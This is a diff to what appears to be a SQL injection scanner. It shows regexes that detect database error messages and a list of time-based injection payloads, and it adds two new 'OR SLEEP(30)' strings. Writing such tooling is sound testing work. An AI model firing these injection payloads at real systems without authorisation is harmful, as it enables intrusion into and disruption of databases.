@@ -13,7 +13,7 @@ sqli_regex = ["SQL syntax.*MySQL|Warning.*mysql_.*|valid MySQL result|MySqlClien
               "SQLite/JDBCDriver|SQLite.Exception|System.Data.SQLite.SQLiteException|Warning.*sqlite_.*|Warning.*SQLite3::|SQLITE_ERROR",
               "(?i)Warning.*sybase.*|Sybase message|Sybase.*Server message.*"]
 
-sqli_timebases = ["- SLEEP(30);", "asdf' OR SLEEP(30) OR 'asdf", "asdf\" OR SLEEP(30) OR \"asdf"]
+sqli_timebases = ["- SLEEP(30);", "asdf' OR SLEEP(30) OR 'asdf", "asdf\" OR SLEEP(30) OR \"asdf","' OR SLEEP(30) OR '1","\" OR SLEEP(30) OR \"1"]
 sqli_error     = ["'", "\""]
 
 endpoints = []
